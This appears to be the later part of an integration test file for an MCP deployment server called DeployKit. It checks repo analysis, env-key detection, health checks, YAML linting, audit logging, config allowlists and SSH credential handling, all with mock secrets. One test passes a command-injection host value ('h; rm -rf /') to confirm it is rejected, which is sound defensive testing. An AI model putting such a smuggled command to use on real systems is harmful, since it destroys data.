assert("emit_root_runbook writes exactly ONE audit line (privilege none)", rbAudit.length === 1 && rbAudit[0]?.privilege === "none", `count=${rbAudit.length}`);

// 6. analysis
const ana = jsonOf(await client.callTool({ name: "analyze_repo", arguments: { repo_path: FIXTURE } }));
assert("analyze_repo detects laravel", ana?.stack === "laravel", JSON.stringify(ana)?.slice(0, 160));
assert("analyze_repo detects Dockerfile + compose", ana?.has_dockerfile === true && ana?.has_compose === true);
assert("analyze_repo finds internal port 2226", (ana?.port_candidates ?? []).some((c) => c.port === 2226), JSON.stringify(ana?.port_candidates));

// 6c. analyze_repo routes a LobeHub checkout to the lobehub profile, not nextjs (#6)
const anaLobe = jsonOf(await client.callTool({ name: "analyze_repo", arguments: { repo_path: LOBE_FIXTURE } }));
assert("analyze_repo detects the lobehub stack (matched before nextjs)", anaLobe?.stack === "lobehub", JSON.stringify(anaLobe?.detection_signals));
assert("analyze_repo points at profiles/lobehub.yml", anaLobe?.profile_to_load === "profiles/lobehub.yml", anaLobe?.profile_to_load);

// 6b. analyze_repo: multiple compose files, podman-only detection, and the warning
const anaMulti = jsonOf(await client.callTool({ name: "analyze_repo", arguments: { repo_path: COMPOSE_FIXTURE } }));
assert("analyze_repo lists ALL compose files found", (anaMulti?.compose_files ?? []).length === 2, JSON.stringify(anaMulti?.compose_files));
assert(
  "analyze_repo flags the podman-only compose file (userns_mode/:U marker)",
  anaMulti?.compose_files?.find((c) => c.file === "compose.yaml")?.podman_only === true,
  JSON.stringify(anaMulti?.compose_files),
);
assert(
  "analyze_repo does NOT flag the Docker-valid compose file",
  anaMulti?.compose_files?.find((c) => c.file === "docker-compose.yml")?.podman_only === false,
  JSON.stringify(anaMulti?.compose_files),
);
assert(
  "analyze_repo emits compose_warning when compose selection is ambiguous",
  typeof anaMulti?.compose_warning === "string" && anaMulti.compose_warning.length > 0,
  anaMulti?.compose_warning,
);
assert(
  "analyze_repo compose_file/has_compose stay back-compat (one docker-preferred file)",
  anaMulti?.compose_file === "compose.yaml" && anaMulti?.has_compose === true,
  anaMulti?.compose_file,
);

// 7. env: keys yes, values never
const env = jsonOf(await client.callTool({ name: "detect_env", arguments: { repo_path: FIXTURE } }));
const envRaw = JSON.stringify(env ?? {});
assert("detect_env returns a classified key list", (env?.keys ?? []).length > 0 && env.keys.every((k) => !!k.class));
assert("detect_env classifies APP_KEY as AUTO", env.keys.find((k) => k.key === "APP_KEY")?.class === "AUTO", JSON.stringify(env.keys.find((k) => k.key === "APP_KEY")));
assert("detect_env classifies DB_PASSWORD as SECRET", env.keys.find((k) => k.key === "DB_PASSWORD")?.class === "SECRET");
assert("detect_env leaks NO env VALUES", !/hunter2-must-not-leak|MUSTNOTLEAK/.test(envRaw), envRaw.slice(0, 200));
assert("detect_env emits no `value` field at all", !(env?.keys ?? []).some((k) => "value" in k));

// 7b. detect_env: config_model — env repo vs settings-json (non-env) repo
assert("detect_env: laravel fixture (.env present) reports config_model \"env\"", env?.config_model === "env", env?.config_model);

const envJson = jsonOf(await client.callTool({ name: "detect_env", arguments: { repo_path: JSON_FIXTURE } }));
assert(
  "detect_env: Dockerfile + settings/*.json + NO dotenv reports the non-env config_model",
  envJson?.config_model === "non-env (json/settings dir) — classify from app docs",
  envJson?.config_model,
);

// 7c. detect_env: .env.sample is scanned and its key surfaced
const envSample = jsonOf(await client.callTool({ name: "detect_env", arguments: { repo_path: ENV_SAMPLE_FIXTURE } }));
assert("detect_env scans .env.sample and reports it as a source", (envSample?.sources_scanned ?? []).includes(".env.sample"), JSON.stringify(envSample?.sources_scanned));
assert("detect_env picks up a key declared only in .env.sample", (envSample?.keys ?? []).some((k) => k.key === "SAMPLE_ONLY_KEY"), JSON.stringify(envSample?.keys));

// 7d. detect_env deep-scans nested compose-subdir env files (#6)
const envNested = jsonOf(await client.callTool({ name: "detect_env", arguments: { repo_path: NESTED_ENV_FIXTURE } }));
assert("detect_env deep-scans docker-compose/deploy/.env.example", (envNested?.sources_scanned ?? []).includes("docker-compose/deploy/.env.example"), JSON.stringify(envNested?.sources_scanned));
assert("detect_env surfaces a key that ONLY exists in the nested env file", (envNested?.keys ?? []).some((k) => k.key === "DATABASE_URL"), JSON.stringify((envNested?.keys ?? []).map((k) => k.key)));

// 8. health
const hc = jsonOf(await client.callTool({ name: "health_check", arguments: { url: "http://127.0.0.1:9/nope", timeout_s: 2 } }));
assert("health_check returns an http_code (000 on refusal)", /^\d{3}$/.test(hc?.http_code ?? ""), JSON.stringify(hc));

// 8b. health_check: an auth-gated app that keeps 307-redirecting ("/" -> "/login"
// -> "/" ...) is the real DeepTutor failure mode. curl -L (flags unchanged) hits
// --max-redirs and exits non-zero, but %{http_code} still carries the real 307.
const redirectServer = http.createServer((_req, res) => {
  res.writeHead(307, { Location: "/login" });
  res.end();
});
await new Promise((resolve) => redirectServer.listen(0, "127.0.0.1", resolve));
const redirectUrl = `http://127.0.0.1:${redirectServer.address().port}/`;

const hcDefault = jsonOf(await client.callTool({ name: "health_check", arguments: { url: redirectUrl, timeout_s: 3 } }));
assert("health_check accepts a 307 as healthy by DEFAULT (expect defaults to 2xx|3xx)", hcDefault?.http_code === "307" && hcDefault?.healthy === true, JSON.stringify(hcDefault));

const hc2xxOnly = jsonOf(await client.callTool({ name: "health_check", arguments: { url: redirectUrl, timeout_s: 3, expect: "2xx" } }));
assert("health_check with expect:\"2xx\" REJECTS a 307", hc2xxOnly?.http_code === "307" && hc2xxOnly?.healthy === false, JSON.stringify(hc2xxOnly));

await new Promise((resolve) => redirectServer.close(resolve));

// 8c. lint_yaml — the plain-scalar colon-trap (#7)
const trapYaml = [
  "job:",
  "  script:",
  '    - echo "WARN: something happened"',   // unquoted command with ": " → trap
  "    - docker compose up -d",              // fine
].join("\n");
const lintBad = jsonOf(await client.callTool({ name: "lint_yaml", arguments: { yaml: trapYaml } }));
assert("lint_yaml flags the plain-scalar colon-trap in a script block", lintBad?.clean === false && (lintBad?.findings ?? []).some((f) => /colon-space/.test(f.issue) && f.line === 3), JSON.stringify(lintBad?.findings));

const safeYaml = [
  "job:",
  "  script:",
  `    - 'echo "WARN: something happened"'`, // whole scalar quoted → safe
  "    - docker compose up -d",
].join("\n");
const lintOk = jsonOf(await client.callTool({ name: "lint_yaml", arguments: { yaml: safeYaml } }));
assert("lint_yaml passes a properly-quoted command scalar", lintOk?.clean === true, JSON.stringify(lintOk?.findings));

// A `key: value` mapping (colon-space in NORMAL yaml) must NOT be flagged.
const mapYaml = ["services:", "  app:", "    image: alpine", "    environment:", "      TZ: UTC"].join("\n");
assert("lint_yaml does NOT flag ordinary key: value mappings", jsonOf(await client.callTool({ name: "lint_yaml", arguments: { yaml: mapYaml } }))?.clean === true, "");

// 8d. pipeline: a self-hosted project ref is passed to glab as `-R` (#8)
const plRun = await client.callTool({ name: "pipeline_run", arguments: { repo_path: FIXTURE, branch: "main", repo: "https://gitlab.example.com/group/project" } });
const glabLog = fs.existsSync(GLAB_LOG) ? fs.readFileSync(GLAB_LOG, "utf8") : "";
assert("pipeline_run passes the self-hosted repo ref via -R", !plRun.isError && /-R https:\/\/gitlab\.example\.com\/group\/project/.test(glabLog), glabLog.slice(0, 200));
const plBare = await client.callTool({ name: "pipeline_run", arguments: { repo_path: FIXTURE, branch: "main", repo: "group/project" } });
assert("pipeline_run REJECTS a bare owner/repo (would hit gitlab.com)", plBare.isError === true && /default to gitlab\.com|carry the host/i.test(textOf(plBare)), textOf(plBare).slice(0, 160));

// 9. audit
const lines = fs.existsSync(AUDIT) ? fs.readFileSync(AUDIT, "utf8").trim().split("\n").filter(Boolean) : [];
const parsed = lines.map((l) => { try { return JSON.parse(l); } catch { return null; } });
assert("audit.jsonl is one valid JSON object per line", parsed.length > 0 && parsed.every(Boolean), `${lines.length} lines`);
assert("exactly ONE audit line for the successful root call", parsed.filter((e) => e?.tool === "grant_docker_access" && e?.outcome === "ok").length === 1);
assert("audit contains NO secret material", !/MOCK-not-a-real-secret|MOCK-SSH-SECRET|MOCK-FTP-WRONG-SECRET|hunter2-must-not-leak/.test(fs.readFileSync(AUDIT, "utf8")));
assert("audit records rejected calls too", parsed.some((e) => e?.outcome === "rejected"));

// 10. operator config file (~/.deploykit/config.json) opens the gate
async function withConfig(configBody) {
  const cfgPath = path.join(TMP, `cfg-${Math.abs(hashCode(configBody))}.json`);
  fs.writeFileSync(cfgPath, configBody);
  const tr = new StdioClientTransport({
    command: "node",
    args: [SERVER],
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"),
      DEPLOYKIT_AUDIT_PATH: AUDIT,
      DEPLOYKIT_CONFIG: cfgPath,
      // Ensure the env override is NOT set, so the file is what's under test.
      DEPLOYKIT_SSHCON_KEYS: "",
    },
    stderr: "pipe",
  });
  const cl = new Client({ name: "cfg-probe", version: "1.0.0" });
  await cl.connect(tr);
  const res = await cl.callTool({ name: "sshcon_resolve", arguments: { key: "learning", kind: "domain" } });
  await cl.close();
  return res;
}
const hashCode = (s) => [...s].reduce((a, c) => (a * 31 + c.charCodeAt(0)) | 0, 7);

// An org that pins targets gets the pin enforced...
const pinned = await withConfig(JSON.stringify({ sshconKeyAllowlist: ["webapp", "webhost"] }));
assert("opt-in pin is ENFORCED (key outside the pin rejected)", pinned.isError === true && /not in the pinned allowlist/i.test(textOf(pinned)), textOf(pinned).slice(0, 160));

// ...and a key inside the pin still works, without leaking its secret.
const pinnedOk = await withConfig(JSON.stringify({ sshconKeyAllowlist: ["learning"] }));
assert("key inside the pin resolves", !pinnedOk.isError && jsonOf(pinnedOk)?.user === "mock_learning", textOf(pinnedOk).slice(0, 160));
assert("pinned key still yields a no-secret handle", !/MOCK-learning-secret/.test(JSON.stringify(jsonOf(pinnedOk) ?? {})));

// A broken config must not crash the server; it falls back to the default
// (unrestricted) rather than taking every tool down.
const cfgBad = await withConfig("{ this is not valid json");
assert("malformed config does not crash the server", !cfgBad.isError && jsonOf(cfgBad)?.user === "mock_learning", textOf(cfgBad).slice(0, 160));

const cfgWrongType = await withConfig(JSON.stringify({ sshconKeyAllowlist: "learning" }));
assert("wrong-typed allowlist is ignored, server still serves", !cfgWrongType.isError, textOf(cfgWrongType).slice(0, 160));

// 10b. Hot-reload (#2): editing the pinned allowlist takes effect on the SAME
// server process — no reconnect. This is one client across an on-disk edit.
const hotCfg = path.join(TMP, "hot-config.json");
fs.writeFileSync(hotCfg, JSON.stringify({ sshconKeyAllowlist: ["webapp"] }));
const hotTr = new StdioClientTransport({
  command: "node",
  args: [SERVER],
  env: {
    ...process.env,
    PATH: `${BIN}:${process.env.PATH}`,
    DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"),
    DEPLOYKIT_AUDIT_PATH: AUDIT,
    DEPLOYKIT_CONFIG: hotCfg,
    DEPLOYKIT_SSHCON_KEYS: "",
  },
  stderr: "pipe",
});
const hotCl = new Client({ name: "hot-reload-probe", version: "1.0.0" });
await hotCl.connect(hotTr);
const beforeReload = await hotCl.callTool({ name: "sshcon_resolve", arguments: { key: "learning", kind: "domain" } });
assert("pinned allowlist rejects a key BEFORE the edit", beforeReload.isError === true && /not in the pinned allowlist/i.test(textOf(beforeReload)), textOf(beforeReload).slice(0, 140));
fs.writeFileSync(hotCfg, JSON.stringify({ sshconKeyAllowlist: ["webapp", "learning"] })); // edit mid-session
const rc = jsonOf(await hotCl.callTool({ name: "reload_config", arguments: {} }));
assert("reload_config reports the freshly-edited allowlist", Array.isArray(rc?.sshcon_key_allowlist) && rc.sshcon_key_allowlist.includes("learning"), JSON.stringify(rc));
const afterReload = await hotCl.callTool({ name: "sshcon_resolve", arguments: { key: "learning", kind: "domain" } });
assert("the newly-added key resolves WITHOUT a restart", !afterReload.isError && jsonOf(afterReload)?.user === "mock_learning", textOf(afterReload).slice(0, 140));
await hotCl.close();

// 11. named targets file — credentials never pass through the agent
async function withTargets(body, args) {
  const tPath = path.join(TMP, `targets-${Math.abs(hashCode(body))}.json`);
  fs.writeFileSync(tPath, body, { mode: 0o600 });
  const tr = new StdioClientTransport({
    command: "node",
    args: [SERVER],
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"),
      DEPLOYKIT_AUDIT_PATH: AUDIT,
      DEPLOYKIT_TARGETS: tPath,
      MOCK_SSH_LOG: SSH_LOG,
      MOCK_SCP_LOG: SCP_LOG,
    },
    stderr: "pipe",
  });
  const cl = new Client({ name: "targets-probe", version: "1.0.0" });
  await cl.connect(tr);
  const res = await cl.callTool({ name: "target_resolve", arguments: args });
  await cl.close();
  return res;
}

// Open a targets-backed client that stays connected for multi-call auth tests
// (resolve THEN domain_exec on the same session/server process).
async function openTargetsClient(body) {
  const tPath = path.join(TMP, `targets-${Math.abs(hashCode(body))}.json`);
  fs.writeFileSync(tPath, body, { mode: 0o600 });
  const tr = new StdioClientTransport({
    command: "node",
    args: [SERVER],
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"),
      DEPLOYKIT_AUDIT_PATH: AUDIT,
      DEPLOYKIT_TARGETS: tPath,
      MOCK_SSH_LOG: SSH_LOG,
      MOCK_SCP_LOG: SCP_LOG,
    },
    stderr: "pipe",
  });
  const cl = new Client({ name: "targets-auth-probe", version: "1.0.0" });
  await cl.connect(tr);
  return cl;
}

// A stand-in private-key file. keyPath only checks existence (the mock ssh
// ignores -i), so its bytes are irrelevant; keyB64/keyEnv paths that DECODE
// material are tested with a base64 PEM below.
const DUMMY_KEY = path.join(TMP, "dummy_id");
fs.writeFileSync(DUMMY_KEY, "-----BEGIN OPENSSH PRIVATE KEY-----\nMOCKKEYMATERIAL\n-----END OPENSSH PRIVATE KEY-----\n", { mode: 0o600 });

const TARGETS = JSON.stringify({
  learning: {
    host: "192.0.2.20",
    port: 2200,
    user: "learning_user",
    password: "MOCK-TARGET-SECRET",
    appDir: "/var/www/clients/client1/web19/web",
  },
  root6: { host: "192.0.2.20", user: "root", password: "MOCK-ROOT-SECRET", kind: "root" },
});

const tgt = await withTargets(TARGETS, { target: "learning" });
const tgtJson = jsonOf(tgt);
assert("target_resolve resolves a named target", !tgt.isError && tgtJson?.host === "192.0.2.20" && tgtJson?.user === "learning_user", textOf(tgt).slice(0, 160));
assert("target_resolve honours port + appDir", tgtJson?.port === 2200 && tgtJson?.app_dir === "/var/www/clients/client1/web19/web", JSON.stringify(tgtJson));
assert("target_resolve NEVER returns the credential", !/MOCK-TARGET-SECRET/.test(JSON.stringify(tgtJson ?? {})), JSON.stringify(tgtJson).slice(0, 200));
assert("target_resolve defaults kind=domain", tgtJson?.kind === "domain", tgtJson?.kind);

const tgtRoot = await withTargets(TARGETS, { target: "root6" });
assert("target_resolve honours declared kind=root", jsonOf(tgtRoot)?.kind === "root", textOf(tgtRoot).slice(0, 120));

const tgtMissing = await withTargets(TARGETS, { target: "nope" });
assert("unknown target REJECTED and lists known names", tgtMissing.isError === true && /known targets:.*learning/i.test(textOf(tgtMissing)), textOf(tgtMissing).slice(0, 160));

// key + password on ONE target is now the fallback PAIR (key tried first), not
// an error. The handle labels it "key" because the key is the primary attempt.
const tgtPair = await withTargets(JSON.stringify({ x: { host: "192.0.2.40", user: "u", password: "p", keyPath: DUMMY_KEY } }), { target: "x" });
assert("target with key + password is ACCEPTED (fallback pair), auth_method=key", !tgtPair.isError && jsonOf(tgtPair)?.auth_method === "key", textOf(tgtPair).slice(0, 160));

// ...but declaring two KEY SOURCES is ambiguous and rejected.
const tgtTwoKeys = await withTargets(JSON.stringify({ x: { host: "h", user: "u", keyPath: DUMMY_KEY, keyB64: "eA==" } }), { target: "x" });
assert("target with two key sources REJECTED", tgtTwoKeys.isError === true && /only ONE key source/i.test(textOf(tgtTwoKeys)), textOf(tgtTwoKeys).slice(0, 160));

const tgtNoAuth = await withTargets(JSON.stringify({ x: { host: "h", user: "u" } }), { target: "x" });
assert("target with NO auth REJECTED", tgtNoAuth.isError === true && /required/i.test(textOf(tgtNoAuth)), textOf(tgtNoAuth).slice(0, 140));

// A resolved target must work with domain_exec exactly like an sshcon session.
const tgt2 = await withTargets(TARGETS, { target: "learning" });
assert("targets audit line carries no secret", !/MOCK-TARGET-SECRET|MOCK-ROOT-SECRET/.test(fs.readFileSync(AUDIT, "utf8")));

// 11b. Auth executor: key is tried FIRST; a key-refusing host falls back to password.
const AUTH_TARGETS = JSON.stringify({
  keyonly: { host: "192.0.2.30", user: "keyonly_user", keyPath: DUMMY_KEY, appDir: "/var/www/clients/client1/web30/web" },
  fallback: { host: "192.0.2.31", user: "fallback_user", keyPath: DUMMY_KEY, password: "MOCK-FALLBACK-PASS", appDir: "/var/www/clients/client1/web31/web" },
});

// Key-only host: the executor uses `ssh -i <key>` with a publickey preference,
// and NEVER touches the password path.
const kc = await openTargetsClient(AUTH_TARGETS);
const kRes = jsonOf(await kc.callTool({ name: "target_resolve", arguments: { target: "keyonly" } }));
assert("key target resolves with auth_method=key", kRes?.auth_method === "key", JSON.stringify(kRes));
const kBefore = fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8").length : 0;
const kUp = await kc.callTool({ name: "domain_exec", arguments: { session_id: kRes.session_id, verb: "docker.compose.up" } });
assert("key-auth verb succeeds", !kUp.isError, textOf(kUp).slice(0, 160));
const kDelta = (fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8") : "").slice(kBefore);
assert("key auth uses `ssh -i <key>` with a publickey preference", /PreferredAuthentications=publickey/.test(kDelta) && kDelta.includes(`-i ${DUMMY_KEY}`), kDelta.slice(0, 240));
assert("key-only path never falls to password auth", !/PreferredAuthentications=password/.test(kDelta), kDelta.slice(0, 240));
await kc.close();

// Fallback host: the key attempt is refused (255) → executor falls back to the
// password attempt, which succeeds. Both attempts must appear in the ssh log.
const fc = await openTargetsClient(AUTH_TARGETS);
const fRes = jsonOf(await fc.callTool({ name: "target_resolve", arguments: { target: "fallback" } }));
const fBefore = fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8").length : 0;
const fUp = await fc.callTool({ name: "domain_exec", arguments: { session_id: fRes.session_id, verb: "docker.compose.up" } });
assert("key→password fallback verb ultimately succeeds", !fUp.isError, textOf(fUp).slice(0, 160));
const fDelta = (fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8") : "").slice(fBefore);
assert("fallback tried publickey FIRST", /fallback_user@/.test(fDelta) && /PreferredAuthentications=publickey/.test(fDelta), fDelta.slice(0, 240));
assert("fallback then used password auth", /PreferredAuthentications=password/.test(fDelta), fDelta.slice(0, 240));
await fc.close();

// 11c. deploy_key_env — a base64 key in a NAMED env var becomes the primary
// credential, and its value never crosses the tool boundary.
const PEM = "-----BEGIN OPENSSH PRIVATE KEY-----\nENVKEYMATERIAL\n-----END OPENSSH PRIVATE KEY-----\n";
const PEM_B64 = Buffer.from(PEM).toString("base64");
async function withDeployKeyEnv(envName, envVal, args) {
  const tr = new StdioClientTransport({
    command: "node",
    args: [SERVER],
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"),
      DEPLOYKIT_AUDIT_PATH: AUDIT,
      MOCK_SSH_LOG: SSH_LOG,
      MOCK_SCP_LOG: SCP_LOG,
      // Isolate from the operator's real ~/.deploykit/config.json: without
      // these the probe inherits the host's key allowlist and the suite only
      // passes on a machine that happens to allow this fixture key.
      DEPLOYKIT_CONFIG: path.join(TMP, "no-such-config.json"),
      DEPLOYKIT_SSHCON_KEYS: "",
      ...(envVal !== null ? { [envName]: envVal } : {}),
    },
    stderr: "pipe",
  });
  const cl = new Client({ name: "deploykey-probe", version: "1.0.0" });
  await cl.connect(tr);
  const res = await cl.callTool({ name: "sshcon_resolve", arguments: args });
  await cl.close();
  return res;
}
const dke = jsonOf(await withDeployKeyEnv("SERVER_ACCESS", PEM_B64, { key: "webapp", kind: "domain", deploy_key_env: "SERVER_ACCESS" }));
assert("deploy_key_env promotes auth_method to key (over the sshcon password)", dke?.auth_method === "key", JSON.stringify(dke));
assert("deploy_key_env handle leaks neither the key nor the sshcon password", !/ENVKEYMATERIAL|MOCK-SSH-SECRET/.test(JSON.stringify(dke ?? {})), JSON.stringify(dke).slice(0, 200));
const dkeMissing = await withDeployKeyEnv("SERVER_ACCESS", null, { key: "webapp", kind: "domain", deploy_key_env: "SERVER_ACCESS" });
assert("deploy_key_env that is unset is reported, not silently ignored", dkeMissing.isError === true && /not set/i.test(textOf(dkeMissing)), textOf(dkeMissing).slice(0, 160));

// 12. sshcon-managed keys (Auth Type: key, no local key path) --------------
// Three parse shapes end-to-end: password (webapp, §2), key-with-path (keyfile),
// and key-no-path → sshcon-managed (gateway).
const kf = jsonOf(await client.callTool({ name: "sshcon_resolve", arguments: { key: "keyfile", kind: "domain" } }));
assert("Auth Type key WITH a key path parses as auth_method=key", kf?.auth_method === "key" && kf?.app_dir === "/var/www/clients/client1/web50/web", JSON.stringify(kf));
assert("keyfile handle leaks no key path as a secret field", !("keyPath" in (kf ?? {})) && !("password" in (kf ?? {})), JSON.stringify(kf));

const gw = await client.callTool({ name: "sshcon_resolve", arguments: { key: "gateway", kind: "domain" } });
const g = jsonOf(gw);
assert("managed key (Auth Type key, no path) resolves with NO disambiguation prompt", !gw.isError && !!g?.session_id, textOf(gw).slice(0, 220));
assert("managed key reports auth_method=sshcon-managed", g?.auth_method === "sshcon-managed", JSON.stringify(g));
assert("managed key parses app_dir from Post-Login Path", g?.app_dir === "/var/www/clients/client1/web108/web", g?.app_dir);
assert("managed key handle leaks NO key material", !/MANAGEDKEYMATERIAL/.test(JSON.stringify(g ?? {})), JSON.stringify(g).slice(0, 200));

// The managed key was materialized to a temp file and used as `ssh -i <file>`.
const gBefore = fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8").length : 0;
const gUp = await client.callTool({ name: "domain_exec", arguments: { session_id: g.session_id, verb: "docker.compose.up" } });
assert("managed-key verb succeeds over the materialized key", !gUp.isError, textOf(gUp).slice(0, 160));
const gDelta = (fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8") : "").slice(gBefore);
const matKey = (gDelta.match(/-i (\S*deploykit-sshkey-\S+)/) ?? [])[1];
assert("managed key materialized to a temp file and used as `ssh -i` with publickey pref", !!matKey && /PreferredAuthentications=publickey/.test(gDelta), gDelta.slice(0, 240));
assert("materialized key file exists on disk during the session", !!matKey && fs.existsSync(matKey), String(matKey));

// rsync.push over the SAME managed session reuses the SAME materialized key (no
// second temp key) and keeps the hardcoded excludes.
const gRsyncBefore = fs.existsSync(RSYNC_LOG) ? fs.readFileSync(RSYNC_LOG, "utf8").length : 0;
const gRsync = await client.callTool({ name: "domain_exec", arguments: { session_id: g.session_id, verb: "rsync.push", params: { src: FIXTURE } } });
assert("rsync.push over a managed session succeeds", !gRsync.isError, textOf(gRsync).slice(0, 160));
const gRsyncDelta = (fs.existsSync(RSYNC_LOG) ? fs.readFileSync(RSYNC_LOG, "utf8") : "").slice(gRsyncBefore);
assert("rsync.push injects the materialized key into the -e transport", !!matKey && gRsyncDelta.includes(`-i ${matKey}`), gRsyncDelta.slice(0, 280));
assert("rsync.push keeps the hardcoded excludes (.git/.env/*-data)", /--exclude \.git/.test(gRsyncDelta) && /--exclude \.env/.test(gRsyncDelta) && /--exclude \*-data\//.test(gRsyncDelta), gRsyncDelta.slice(0, 280));
assert("rsync.push argv leaks no key material", !/MANAGEDKEYMATERIAL/.test(gRsyncDelta) && !/MANAGEDKEYMATERIAL/.test(JSON.stringify(jsonOf(gRsync) ?? {})), gRsyncDelta.slice(0, 120));

// 12b. Version gate: an sshcon too old to export the key is refused with a hint.
async function resolveWithSshconVersion(version, args) {
  const tr = new StdioClientTransport({
    command: "node",
    args: [SERVER],
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"),
      DEPLOYKIT_AUDIT_PATH: AUDIT,
      MOCK_SSH_LOG: SSH_LOG,
      MOCK_SSHCON_VERSION: version,
      DEPLOYKIT_CONFIG: path.join(TMP, "no-such-config.json"),
      DEPLOYKIT_SSHCON_KEYS: "",
    },
    stderr: "pipe",
  });
  const cl = new Client({ name: "ver-probe", version: "1.0.0" });
  await cl.connect(tr);
  const res = await cl.callTool({ name: "sshcon_resolve", arguments: args });
  await cl.close();
  return res;
}
const oldVer = await resolveWithSshconVersion("2.12.0", { key: "gateway", kind: "domain" });
assert("managed key REJECTED when sshcon is older than the 2.13.0 min", oldVer.isError === true && /2\.13\.0|ssh-key --write|sshcon upgrade/i.test(textOf(oldVer)), textOf(oldVer).slice(0, 220));
assert("version-gate rejection points at the ssh_resolve fallback", /ssh_resolve/.test(textOf(oldVer)), textOf(oldVer).slice(0, 260));
const newVer = await resolveWithSshconVersion("2.13.0", { key: "gateway", kind: "domain" });
assert("managed key resolves when sshcon >= min", !newVer.isError && jsonOf(newVer)?.auth_method === "sshcon-managed", textOf(newVer).slice(0, 160));

// 13. ssh_resolve — inline creds, works without sshcon --------------------
const iKey = jsonOf(await client.callTool({ name: "ssh_resolve", arguments: { host: "192.0.2.60", user: "web60", app_dir: "/var/www/clients/client1/web60/web", key_path: DUMMY_KEY } }));
assert("ssh_resolve with a key_path resolves (auth_method=key, source inline)", iKey?.auth_method === "key" && iKey?.host === "192.0.2.60" && iKey?.app_dir === "/var/www/clients/client1/web60/web" && iKey?.source === "inline", JSON.stringify(iKey));

const iPw = jsonOf(await client.callTool({ name: "ssh_resolve", arguments: { host: "192.0.2.61", user: "web61", password: "MOCK-INLINE-PASS" } }));
assert("ssh_resolve with a password resolves (auth_method=password)", iPw?.auth_method === "password", JSON.stringify(iPw));
assert("ssh_resolve NEVER returns the inline password", !/MOCK-INLINE-PASS/.test(JSON.stringify(iPw ?? {})), JSON.stringify(iPw).slice(0, 200));

const iBadPath = await client.callTool({ name: "ssh_resolve", arguments: { host: "h", user: "u", key_path: "/nonexistent/deploykit/nope-id" } });
assert("ssh_resolve REJECTS a key_path that does not exist on this machine", iBadPath.isError === true && /not found/i.test(textOf(iBadPath)), textOf(iBadPath).slice(0, 140));

const iNoCred = await client.callTool({ name: "ssh_resolve", arguments: { host: "h", user: "u" } });
assert("ssh_resolve REJECTS when no credential is given", iNoCred.isError === true && /no credential/i.test(textOf(iNoCred)), textOf(iNoCred).slice(0, 140));

const iTwoKeys = await client.callTool({ name: "ssh_resolve", arguments: { host: "h", user: "u", key_path: DUMMY_KEY, key_env: "SOME_ENV" } });
assert("ssh_resolve REJECTS two key sources", iTwoKeys.isError === true && /only ONE key source/i.test(textOf(iTwoKeys)), textOf(iTwoKeys).slice(0, 140));

const iBadHost = await client.callTool({ name: "ssh_resolve", arguments: { host: "h; rm -rf /", user: "u", password: "x" } });
assert("ssh_resolve REJECTS an argv-unsafe host", iBadHost.isError === true, textOf(iBadHost).slice(0, 140));

// ssh_resolve audit lines never carry the credential.
assert("ssh_resolve audit trail carries no inline password", !/MOCK-INLINE-PASS/.test(fs.readFileSync(AUDIT, "utf8")));

// --- report ---------------------------------------------------------------
console.log("\n" + "=".repeat(74));
for (const [status, name, detail] of results) {
  console.log(`  ${status === "PASS" ? "✔" : "✘"} ${status}  ${name}`);
  if (status === "FAIL" && detail) console.log(`        ↳ ${detail}`);
}
console.log("=".repeat(74));
console.log(`  ${pass} passed, ${fail} failed, ${pass + fail} total   |   audit lines: ${lines.length}`);
console.log("=".repeat(74) + "\n");

await client.close();
fs.rmSync(TMP, { recursive: true, force: true });
process.exit(fail === 0 ? 0 : 1);
